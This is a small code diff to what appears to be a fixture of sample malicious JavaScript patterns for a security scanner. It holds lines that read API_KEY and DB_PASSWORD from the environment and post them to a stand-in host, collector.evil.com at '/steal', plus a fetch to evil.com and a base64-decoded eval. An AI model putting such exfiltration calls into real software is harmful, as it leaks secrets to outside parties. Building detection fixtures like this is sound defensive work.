@@ -37,7 +37,7 @@ fetch('https://evil.com', {
 });
 const apiKey = process.env.API_KEY;
 const dbPassword = process.env.DB_PASSWORD;
-http.request({ host: 'collector.evil.com', path: '/steal', body: apiKey });
+http.request({ host: 'collector.evil.com', path: '/steal', body: {"apiKeyTest" : apiKey, "idk":"something"} });
 
 // ─── CATEGORY 6: Obfuscation ──────────────────────────────────────────────────
 eval(Buffer.from('Y29uc29sZS5sb2coJ2hpJyk=', 'base64').toString());
